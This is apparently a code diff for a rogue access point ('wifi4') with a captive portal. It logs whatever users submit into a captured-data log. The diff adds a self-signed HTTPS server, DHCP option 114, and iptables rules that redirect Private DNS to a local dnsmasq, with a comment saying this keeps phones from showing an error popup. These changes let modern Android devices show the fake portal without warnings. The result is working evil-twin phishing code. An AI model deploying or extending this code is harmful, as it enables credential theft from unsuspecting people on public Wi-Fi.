@@ -15,6 +15,7 @@ import threading
 import time
 import http.server
 import socketserver
+import ssl
 import urllib.parse
 import json
 import re
@@ -57,6 +58,8 @@ AP_INTERFACE = ""  # Set dynamically
 HOSTAPD_CONF = "/tmp/wifi4_hostapd.conf"
 DNSMASQ_CONF = "/tmp/wifi4_dnsmasq.conf"
 DNS_LOG = "/tmp/wifi4_dns.log"
+SSL_CERT = "/tmp/wifi4_portal.crt"
+SSL_KEY = "/tmp/wifi4_portal.key"
 TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "captive_portal", "templates")
 
 # ── Session output folder (created at AP start) ───────────
@@ -298,6 +301,8 @@ no-poll
 dhcp-range={AP_DHCP_START},{AP_DHCP_END},255.255.255.0,24h
 dhcp-option=option:router,{AP_IP}
 dhcp-option=option:dns-server,{AP_IP}
+# Android 11+ Captive Portal API (RFC7710bis) — DHCP option 114
+dhcp-option=114,http://{AP_IP}/
 """
     if dns_only:
         # DNS-only mode: log all DNS queries, redirect everything to local
@@ -609,10 +614,29 @@ class CaptivePortalHandler(http.server.BaseHTTPRequestHandler):
         self.wfile.write(self.success_html.encode("utf-8"))
 
 
-class CaptivePortalServer:
-    """Manages the captive portal HTTP server."""
+def generate_ssl_cert():
+    """Generate self-signed SSL certificate for HTTPS captive portal."""
+    if os.path.exists(SSL_CERT) and os.path.exists(SSL_KEY):
+        return True
+    try:
+        subprocess.run([
+            "openssl", "req", "-x509", "-newkey", "rsa:2048",
+            "-keyout", SSL_KEY, "-out", SSL_CERT,
+            "-days", "365", "-nodes",
+            "-subj", "/CN=portal.wifi4.local"
+        ], capture_output=True, timeout=10)
+        if os.path.exists(SSL_CERT) and os.path.exists(SSL_KEY):
+            RealtimeLogger.ok("SSL certificate generated for HTTPS portal")
+            return True
+    except Exception as e:
+        RealtimeLogger.warn(f"SSL cert generation failed: {e}")
+    return False
 
-    def __init__(self, port: int = 8080, portal_html: str = "", success_html: str = "",
+
+class CaptivePortalServer:
+    """Manages the captive portal HTTP + HTTPS servers."""
+
+    def __init__(self, port: int = 80, portal_html: str = "", success_html: str = "",
                  grant_internet_after_submit: bool = False,
                  internet_before_form: bool = True,
                  ap_interface: str = ""):
@@ -623,10 +647,12 @@ class CaptivePortalServer:
         self.internet_before_form = internet_before_form
         self.ap_interface = ap_interface
         self.httpd = None
+        self.httpsd = None
         self.thread = None
+        self.https_thread = None
 
     def start(self):
-        """Start the HTTP server in a background thread."""
+        """Start HTTP and HTTPS servers in background threads."""
         CaptivePortalHandler.portal_html = self.portal_html
         CaptivePortalHandler.success_html = self.success_html
         CaptivePortalHandler.capture_log = CAPTURED_LOG
@@ -634,17 +660,34 @@ class CaptivePortalServer:
         CaptivePortalHandler.internet_before_form = self.internet_before_form
         CaptivePortalHandler.ap_interface = self.ap_interface
 
+        # HTTP server (port 80)
         self.httpd = socketserver.TCPServer(("0.0.0.0", self.port), CaptivePortalHandler)
         self.httpd.allow_reuse_address = True
         self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
         self.thread.start()
-        RealtimeLogger.ok(f"Captive portal HTTP server running on port {self.port}")
+        RealtimeLogger.ok(f"HTTP server running on port {self.port}")
+
+        # HTTPS server (port 443) — required for Android 14+ captive portal
+        if generate_ssl_cert():
+            try:
+                self.httpsd = socketserver.TCPServer(("0.0.0.0", 443), CaptivePortalHandler)
+                self.httpsd.allow_reuse_address = True
+                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+                context.load_cert_chain(SSL_CERT, SSL_KEY)
+                self.httpsd.socket = context.wrap_socket(self.httpsd.socket, server_side=True)
+                self.https_thread = threading.Thread(target=self.httpsd.serve_forever, daemon=True)
+                self.https_thread.start()
+                RealtimeLogger.ok("HTTPS server running on port 443 (self-signed cert)")
+            except Exception as e:
+                RealtimeLogger.warn(f"HTTPS server failed: {e}")
 
     def stop(self):
-        """Stop the HTTP server."""
+        """Stop both HTTP and HTTPS servers."""
         if self.httpd:
             self.httpd.shutdown()
-            RealtimeLogger.info("Captive portal HTTP server stopped")
+        if self.httpsd:
+            self.httpsd.shutdown()
+        RealtimeLogger.info("Captive portal servers stopped")
 
 
 # ──────────────────────────────────────────────────────────────
@@ -755,8 +798,10 @@ def setup_internet_forwarding(ap_interface: str, internet_interface: str = None)
             "-j", "ACCEPT"
         ], capture_output=True, timeout=5)
 
-        # NOTE: Captive portal server now listens on port 80 directly
-        # No iptables redirect needed — the server handles all HTTP on port 80
+        # Redirect HTTPS (443) to our HTTPS server (port 443)
+        # This is critical for Android 14+ captive portal detection
+        # NOTE: Captive portal server listens on port 80 + 443 directly
+        # iptables REDIRECT handles any remaining HTTPS traffic
 
         # Block all other forwarding (except DNS/DHCP which are handled above)
         # This forces devices into captive portal mode — they can't reach the internet
@@ -802,16 +847,14 @@ def setup_captive_portal_firewall(ap_interface: str):
         subprocess.run(["iptables", "-A", "INPUT", "-i", ap_interface, "-p", "udp", "--dport", "53", "-j", "ACCEPT"], capture_output=True, timeout=5)
         subprocess.run(["iptables", "-A", "INPUT", "-i", ap_interface, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"], capture_output=True, timeout=5)
 
-        # Allow HTTP to our captive portal server (port 80)
+        # Allow HTTP (port 80) and HTTPS (port 443) to our captive portal server
         subprocess.run(["iptables", "-A", "INPUT", "-i", ap_interface, "-p", "tcp", "--dport", "80", "-j", "ACCEPT"], capture_output=True, timeout=5)
+        subprocess.run(["iptables", "-A", "INPUT", "-i", ap_interface, "-p", "tcp", "--dport", "443", "-j", "ACCEPT"], capture_output=True, timeout=5)
 
         # REDIRECT Private DNS (port 853) to our dnsmasq (port 53)
         # This makes phones think Private DNS works — no error popup!
         subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", ap_interface, "-p", "tcp", "--dport", "853", "-j", "REDIRECT", "--to-port", "53"], capture_output=True, timeout=5)
         subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", ap_interface, "-p", "udp", "--dport", "853", "-j", "REDIRECT", "--to-port", "53"], capture_output=True, timeout=5)
-
-        # Block HTTPS to external servers (prevents DoH bypass)
-        subprocess.run(["iptables", "-A", "INPUT", "-i", ap_interface, "-p", "tcp", "--dport", "443", "-j", "DROP"], capture_output=True, timeout=5)
 
         # Block ALL forwarding (internet)
         subprocess.run(["iptables", "-A", "FORWARD", "-i", ap_interface, "-j", "DROP"], capture_output=True, timeout=5)
